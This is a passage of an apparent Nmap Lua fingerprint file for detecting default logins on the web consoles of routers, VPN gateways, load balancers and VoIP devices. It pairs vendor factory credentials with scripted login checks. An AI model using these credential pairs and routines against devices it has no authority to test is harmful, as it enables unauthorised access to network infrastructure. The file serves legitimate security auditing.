  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("login.cgi", 1, true)
           and get_tag(response.body, "form", {action="^cgi%-bin/login%.cgi$"})
           and response.body:lower():find("<title>femtocell management system</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = ("cgi-bin/login.cgi?username=%s&password=%s&Submit=Login"):format(
                 url.escape(user), url.escape(pass))
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and get_cookie(resp, "sessionID", ".")
           and (resp.body or ""):find("%Wwindow%.location%s*=%s*(['\"])mainFrame%.cgi%1")
  end
})

table.insert(fingerprints, {
  name = "Datum Systems SnIP",
  cpe = "cpe:/o:datumsystems:snip",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^SnIP%d+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Option GlobeSurfer II",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("GlobeSurfer II", 1, true)
           and response.body:find("%Wf%.action%s*=%s*(['\"])[^'\"]-/cache/%d+/upgrade%.cgi%1")
           and get_cookie(response, "session_id", "^%d+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local page2 = get_tag(resp1.body, "input", {name="^active_page$", value="^%d+$"})
    local url2 = resp1.body:match(".*%Wfunction%s+mimic_button%s*%([^}]-%Wcase%s+0%s*:[^}]-%Wf%.action%s*=%s*['\"]([^'\"]-/cache/%d+/index%.cgi)['\"]")
    if not (page2 and url2) then return false end
    local form2 = {active_page=page2.value,
                   prev_page=0,
                   page_title="Connection status",
                   nav_stack_0=page2.value,
                   mimic_button_field="sidebar: sidebar_logout..",
                   button_value="",
                   transaction_id=0}
    local resp2 = http_post_simple(host, port, url2,
                                  {cookies=resp1.cookies}, form2)
    if not (resp2.status == 200 and resp2.body) then return false end
    local authkey = get_tag(resp2.body, "input", {name="^auth_key$", value="^%d+$"})
    local transid = get_tag(resp2.body, "input", {name="^transaction_id$", value="^%d+$"})
    local page3 = get_tag(resp2.body, "input", {name="^active_page$", value="^%d+$"})
    local url3 = resp2.body:match(".*%Wfunction%s+mimic_button%s*%([^}]-%Wcase%s+0%s*:[^}]-%Wf%.action%s*=%s*['\"]([^'\"]-/cache/(%d+)/index%.cgi)['\"]")
    if not (authkey and transid and page3 and url3) then return false end
    local form3 = {active_page=page3.value,
                   prev_page=page2.value,
                   page_title="Login",
                   nav_stack_0=page3.value,
                   ["nav_" .. page3.value .. "_button_value"]="sidebar_logout",
                   mimic_button_field="submit_button_login_submit: ..",
                   button_value="sidebar_logout",
                   transaction_id=transid.value,
                   lang=0,
                   user_name=user,
                   ["password_" .. get_cookie(resp2, "session_id")]="",
                   md5_pass=stdnse.tohex(openssl.md5(pass .. authkey.value)),
                   auth_key=authkey.value}
    local resp3 = http_post_simple(host, port, url3,
                                  {cookies=resp2.cookies}, form3)
    return resp3.status == 200
           and (resp3.body or ""):find("sidebar%5Fadvanced..", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Option GlobeSurfer III",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("md5_pass", 1, true)
           and response.body:lower():find("<title>[^<]-globesurfer%W")
           and get_cookie(response, "rg_cookie_session_id", "^%d+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local authkey = get_tag(resp1.body, "input", {name="^auth_key$", value="^%d+$"})
    if not authkey then return false end
    local form = {active_page="page_login",
                  prev_page="",
                  page_title="Login",
                  mimic_button_field="submit_button_login_submit: ..",
                  button_value="",
                  strip_page_top=0,
                  page_title_text="Login",
                  page_icon_number=30,
                  defval_lang=0,
                  defval_username="",
                  md5_pass=stdnse.tohex(openssl.md5(pass .. authkey.value)),
                  auth_key=authkey.value,
                  lang=0,
                  username=user,
                  ["password_" .. get_cookie(resp1, "rg_cookie_session_id")]=""}
    local resp2 = http_post_simple(host, port, url.absolute(path, "index.cgi"),
                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("active%5fpage=page%5fhome", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Digi TransPort",
  category = "routers",
  paths = {
    {path = "/login.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("TransPort WR", 1, true)
           and response.body:lower():find("<title>transport wr", 1, true)
           and get_cookie(response, "SID", "^%x+$")
  end,
  login_combos = {
    {username = "username", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.cookies) then return false end
    local form = {username=user,
                  password=pass,
                  login="LOG IN"}
    local resp2 = http_post_simple(host, port, path,
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/default%.asp$")
  end
})

table.insert(fingerprints, {
  name = "Sea Tel MXP",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Micro Digital Web Server"
           and response.body
           and response.body:find("MXP", 1, true)
           and response.body:lower():find("%Wwindow%.location%.href%s*=%s*(['\"])login%.html%1")
  end,
  login_combos = {
    {username = "Dealer",   password = "seatel1"},
    {username = "SysAdmin", password = "seatel2"},
    {username = "User",     password = "seatel3"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {uId=user,
                  uPwd=pass,
                  uLoginMode="in",
                  callConter=0}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/userValidate"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("^%s*%^true%s*$")
  end
})

table.insert(fingerprints, {
  name = "Thrane & Thrane Sailor 900 VSAT (var.1)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "tt_adm", "^%l+$")
           and response.body
           and get_tag(response.body, "form", {action="%?pageid=%w+$"})
           and get_tag(response.body, "input", {name="^pass_login$"})
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local frm = get_tag(resp1.body, "form", {action="%?pageid=%w+$"})
    if not frm then return false end
    local resp2 = http_post_simple(host, port, url.absolute(path, frm.action),
                                  nil, {user_login=user,pass_login=pass})
    return resp2.status == 200
           and url.unescape(get_cookie(resp2, "tt_adm", "%%3[Aa]") or ""):find(":" .. user .. ":", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Thrane & Thrane Sailor 900 VSAT (var.2)",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "tt_adm", "^%l+$")
           and response.body
           and response.body:find("900 VSAT", 1, true)
           and get_tag(response.body, "a", {href="%?pageid=administration$"})
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local llink = get_tag(resp1.body, "a", {href="%?pageid=administration$"})
    if not llink then return false end
    local resp2 = http_post_simple(host, port, url.absolute(path, llink.href),
                                  nil, {user_login=user,pass_login=pass})
    return resp2.status == 200
           and url.unescape(get_cookie(resp2, "tt_adm", "%%3[Aa]") or ""):find(":" .. user .. ":", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Ubiquiti AirOS",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 302
           and (response.header["location"] or ""):find("/cookiechecker?uri=/", 1, true)) then
      return false
    end
    for _, ck in ipairs(response.cookies or {}) do
      if ck.name == "AIROS_SESSIONID" or ck.name:find("^AIROS_%x+$") then
        return ck.value:find("^%x+$")
      end
    end
    return false
  end,
  login_combos = {
    {username = "ubnt", password = "ubnt"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_multipart(host, port,
                                    url.absolute(path, "login.cgi"), nil,
                                    {uri=path, username=user, password=pass})
    return resp.status == 302
           and resp.header["location"] == path
  end
})

table.insert(fingerprints, {
  name = "Ubiquiti EdgeOS",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">EdgeOS<", 1, true)
           and response.body:find("%WEDGE%.Config%s*=")
           and response.body:lower():find("<title>edgeos</title>")
  end,
  login_combos = {
    {username = "ubnt", password = "ubnt"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {username=user,password=pass})
    return (resp.status == 302 or resp.status == 303)
           and (resp.header["location"] or ""):sub(-#path) == path
           and get_cookie(resp, "PHPSESSID", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "Ubiquiti EdgeSwitch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">Ubiquiti EdgeSwitch<", 1, true)
           and response.body:lower():find("<title>ubiquiti edgeswitch</title>")
           and get_tag(response.body, "script", {src="/static/scripts/bundle%-%x+%.js$"})
  end,
  login_combos = {
    {username = "ubnt", password = "ubnt"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=path})),
                    ["Content-Type"]="application/json",
                    ["Accept"]="application/json, text/plain, */*"}
    local jin = {username=user, password=pass}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "api/v1.0/user/login"),
                                 {header=header}, json.generate(jin))
    return resp.status == 200
           and (resp.header["x-auth-token"] or ""):find("^%x+$")
  end
})

table.insert(fingerprints, {
  name = "NetComm ADSL router",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^NetComm ")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netcomm NTC",
  category = "routers",
  paths = {
    {path = "/index.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NetComm", 1, true)
           and response.body:lower():find("/netcomm_gui_banner.jpg", 1, true)
           and get_cookie(response, "_appwebSessionId_", "^%x+$")
  end,
  login_combos = {
    {username = "root", password = "admin"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {username=user,password=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/st[as]tus%.html%f[?\0]")
  end
})

table.insert(fingerprints, {
  name = "Netcomm 3G17Wn",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">3G17Wn", 1, true)
           and get_cookie(response, "_appwebSessionId_", "^%x+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {username=user,password=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/adm/status%.asp$")
  end
})

table.insert(fingerprints, {
  name = "NetComm 3G21WB",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("3G21WB", 1, true)
           and response.body:lower():find("<title>3g21wb", 1, true)
           and get_tag(response.body, "frame", {src="^menu%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "menu.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "NetComm 3G42WT",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("3G42WT", 1, true)
           and response.body:lower():find("<title>3g42wt", 1, true)
           and get_tag(response.body, "frame", {src="^login%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "login.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "PacketFront DRG600",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "drg600.wifi"
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Airlink ACEmanager",
  cpe = "cpe:/h:sierrawireless:airlink_mp_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Sierra Wireless AirLink", 1, true)
           and response.body:lower():find("<title>:+%s+acemanager%s+:+</title>")
  end,
  login_combos = {
    {username = "user", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    local encuser = xmlencode(user)
    local header = {["Content-Type"]="text/xml"}
    local msg = [=[
      <request xmlns="urn:acemanager">
        <connect>
          <login>__USER__</login>
          <password><![CDATA[__PASS__]]></password>
        </connect>
      </request>
      ]=]
    msg = msg:gsub("%f[^\0\n]%s+", "")
    msg = msg:gsub("__%w+__", {__USER__=encuser, __PASS__=pass})
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "xml/Connect.xml"),
                                 {header=header}, msg)
    return resp.status == 200 and get_cookie(resp, "token", "^%d+$")
  end
})

table.insert(fingerprints, {
  name = "Mimosa Relay",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Mimosa", 1, true)
           and response.body:find("%Wmimosa%.isConnected%s*=")
  end,
  login_combos = {
    {username = "configure", password = "mimosa"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 path .. "?q=index.login&mimosa_ajax=1",
                                 nil, {username=user,password=pass})
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and (jout.role or 0) ~= 0
  end
})

table.insert(fingerprints, {
  name = "IRTE Digital Radio Link",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Z-World Rabbit"
           and response.body
           and get_tag(response.body, "frame", {src="^objsum00%.html$"})
  end,
  login_combos = {
    {username = "", password = "0000"},
    {username = "", password = "111111"}
  },
  login_check = function (host, port, path, user, pass)
    local form1 = stdnse.output_table()
    form1.infield5 = 1
    form1.infield6 = pass
    local resp1 = http_post_multipart(host, port,
                                     url.absolute(path, "pswd.cgi"), nil, form1)
    if not (resp1.status == 200 and (resp1.body or ""):find("(['\"])password%.html%1")) then
      return false
    end
    local resp2 = http_get_simple(host, port,
                                 url.absolute(path, "password.html"))
    return resp2.status == 200
           and get_tag(resp2.body or "", "input", {name="^infield5$", value="^2$"})
  end
})

table.insert(fingerprints, {
  name = "Motorola AP",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^lighttpd/%d+%.")
           and response.body
           and response.body:find(">Motorola", 1, true)
           and response.body:lower():find("<title>motorola solutions</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "motorola"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {_dc = math.floor(stdnse.clock_ms()),
                  username = user,
                  password = pass}
    local lurl = url.absolute(path, "rest.fcgi/services/rest/login?" .. url.build_query(form))
    local resp = http_get_simple(host, port, lurl)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.status
  end
})

table.insert(fingerprints, {
  name = "Motorola RF Switch",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^thttpd/%d+%.")
           and response.body
           and response.body:find(">Motorola", 1, true)
           and response.body:lower():find("<title>motorola wireless network management</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "superuser"}
  },
  login_check = function (host, port, path, user, pass)
    local login = ("J20K34NMMT89XPIJ34S login %s %s"):format(stdnse.tohex(user), stdnse.tohex(pass))
    local lurl = url.absolute(path, "usmCgi.cgi/?" .. url.escape(login))
    local resp = http_get_simple(host, port, lurl)
    return resp.status == 200
           and (resp.body or ""):find("^login 0 ")
  end
})

table.insert(fingerprints, {
  name = "Pakedge C36 Macrocell Controller",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and response.header["location"] == "./c36/login.php"
  end,
  login_combos = {
    {username = "pakedge", password = "pakedgec"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {rtype="login",
                  username=user,
                  password=pass}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "c36/ajax/login.php"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.ok
  end
})

table.insert(fingerprints, {
  name = "ArubaOS WebUI",
  cpe = "cpe:/o:arubanetworks:arubaos",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 401
           and response.body
           and response.body:find("/images/arubalogo.gif", 1, true)
           and response.body:find("/screens/wms/wms.login", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {opcode="login",
                  url="/",
                  needxml=0,
                  uid=user,
                  passwd=pass}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "screens/wms/wms.login"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("/screens/wmsi/monitor.summary.html", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Aruba AirWave",
  cpe = "cpe:/a:arubanetworks:airwave",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/noauth/theme/airwave/favicon.ico", 1, true)
           and response.body:lower():find("%shref%s*=%s*(['\"])[^'\"]-/mercury%.%d+%.css%1")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {credential_0=user,
                  credential_1=pass,
                  destination=url.absolute(path, "index.html")}
    local resp = http_post_simple(host, port, url.absolute(path, "LOGIN"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/index%.html$")
  end
})

table.insert(fingerprints, {
  name = "Nortel VPN Router",
  cpe = "cpe:/h:nortel:vpn_router_*",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "HTTP Server"
           and response.body
           and response.body:find(">Nortel", 1, true)
           and response.body:lower():find("<title>nortel vpn router</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "setup"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "manage/bdy_sys.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "pfSense (var.1)",
  cpe = "cpe:/a:bsdperimeter:pfsense",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/pfsense/login.css", 1, true)
           and get_tag(response.body, "form", {name="^login_iform$"})
  end,
  login_combos = {
    {username = "admin", password = "pfsense"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {usernamefld=user,
                  passwordfld=pass,
                  login="Login"}
    local resp = http_post_simple(host, port, url.absolute(path, "index.php"),
                                 nil, form)
    return resp.status == 302
           and resp.header["location"] == path
           and get_cookie(resp, "PHPSESSID", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "pfSense (var.2)",
  cpe = "cpe:/a:pfsense:pfsense",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("pfSense", 1, true)
           and get_tag(response.body, "input", {name="^__csrf_magic$"})
  end,
  login_combos = {
    {username = "admin", password = "pfsense"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^__csrf_magic$", value=""})
    if not token then return false end
    local form = {[token.name]=token.value,
                  usernamefld=user,
                  passwordfld=pass,
                  login=""}
    local resp2 = http_post_simple(host, port, url.absolute(path, "index.php"),
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and resp2.header["location"] == path
           and get_cookie(resp2, "PHPSESSID", "^%w+$")
  end
})

table.insert(fingerprints, {
  name = "ScreenOS",
  cpe = "cpe:/o:juniper:netscreen_screenos",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Virata%-EmWeb/R%d+_")
           and response.body
           and response.body:lower():find("admin_pw", 1, true)
  end,
  login_combos = {
    {username = "netscreen", password = "netscreen"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {admin_id="",
                  admin_pw="",
                  time=tostring(math.floor(stdnse.clock_ms())):sub(5),
                  un=base64.enc(user),
                  pw=base64.enc(pass)}
    local resp = http_post_simple(host, port, url.absolute(path, "index.html"),
                                 nil, form)
    return resp.status == 303
           and (resp.header["location"] or ""):find("/nswebui.html?", 1, true)
  end
})

table.insert(fingerprints, {
  name = "F5 TMOS",
  cpe = "cpe:/o:f5:tmos",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("F5 Networks", 1, true)
           and response.body:find("BIG-IP", 1, true)
           and response.body:find("/tmui/tmui/system/settings/redirect.jsp", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=url.absolute(path, "tmui/login.jsp")}))}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "tmui/logmein.html?"),
                                 {header=header}, {username=user,passwd=pass})
    return resp.status == 302
           and get_cookie(resp, "BIGIPAuthCookie", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "F5 BIG-IQ",
  cpe = "cpe:/a:f5:big-iq_centralized_management",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 301
           and response.header["server"] == "webd"
           and (response.header["location"] or ""):find("/ui/login/?$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Content-Type"]="application/json;charset=utf-8"}
    local jin = {username=user, password=pass, needsToken=true}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "mgmt/shared/authn/login"),
                                 {header=header}, json.generate(jin))
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.username == user and jout.token
  end
})

table.insert(fingerprints, {
  name = "Citrix NetScaler",
  cpe = "cpe:/a:citrix:netscaler",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NetScaler", 1, true)
           and response.body:lower():find("<title>citrix login</title>", 1, true)
  end,
  login_combos = {
    {username = "nsroot", password = "nsroot"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {username=user,
                  password=pass,
                  url="",
                  timezone_offset=0}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "login/do_login"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/menu/neo$")
           and get_cookie(resp, "startupapp") == "neo"
  end
})

table.insert(fingerprints, {
  name = "Citrix NetScaler MAS",
  category = "routers",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/admin_ui/mas/ent/login%.html$")
  end,
  login_combos = {
    {username = "nsroot", password = "nsroot"}
  },
  login_check = function (host, port, path, user, pass)
    local jin = {login={username=user,password=pass}}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "nitro/v1/config/login"),
                                 nil, {object=json.generate(jin)})
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.errorcode == 0 and jout.resourceName == user
  end
})

---
--VoIP
---
table.insert(fingerprints, {
  name = "Aastra IP Phone",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^Aastra %d+i$")
  end,
  login_combos = {
    {username = "admin", password = "22222"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Aastra AXS 5000",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local lurl = response.header["location"] or ""
    if not (response.status == 302 and lurl:find("/rhm$")) then return false end
    local resp = http_get_simple(host, port, lurl)
    return http_auth_realm(resp) == "Aastra 5000"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "rhm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Aastra OpenCom 1000",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("OpenCom", 1, true)
           and response.body:lower():find("<title>opencom 1000</title>", 1, true)
           and get_tag(response.body, "frame", {src="/login%.html$"})
  end,
  login_combos = {
    {username = "Admin", password = "Admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, url.absolute(path, "login.html"))
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {name="^login$", value="^%x+$"})
    if not token then return false end
    pass = stdnse.tohex(openssl.md5(pass))
    local form2 = {login=stdnse.tohex(openssl.md5(token.value .. pass)),
                   user=user,
                   password="",
                   ButtonOK="OK"}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "summary.html"),
                                  nil, form2)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/%?uid=0x%x+$")
  end
})

table.insert(fingerprints, {
  name = "Cisco TelePresence",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/web/signin$")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "web/signin/open"), nil,
                                 {username=user, password=pass})
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.result == "ok"
  end
})

table.insert(fingerprints, {
  name = "Dialogic PowerMedia XMS Console",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/verifyLogin/", 1, true)
           and response.body:lower():find("<title>%s*dialogic xms admin console%s*</title>")
  end,
  login_combos = {
    {username = "viewer",     password = "admin"},
    {username = "admin",      password = "admin"},
    {username = "superadmin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "index.php/verifyLogin/login"),
                                 nil, {usernameId=user, passwordId=pass})
    return resp.status == 200
           and get_cookie(resp, "ci_session", "USERNAME")
  end
})

table.insert(fingerprints, {
  name = "Dialogic PowerMedia XMS NodeController",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "NodeController"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Dialogic PowerMedia XMS RESTful API",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "XMS RESTful API"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Grandstream VoIP Device",
  category = "voip",
  paths = {
    {path = "/cgi-bin/login"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Grandstream", 1, true)
           and response.body:lower():find("<title>grandstream ?device configuration</title>")
           and get_tag(response.body, "input", {name="^gnkey$", type="^hidden$", value="^0b82$"})
  end,
  login_combos = {
    {username = "", password = "admin"},
    {username = "", password = "123"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "dologin"),
                                 nil, {P2=pass,Login="Login",gnkey="0b82"})
    return resp.status == 200 and get_cookie(resp, "session_id", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "Grandstream GXP2200",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
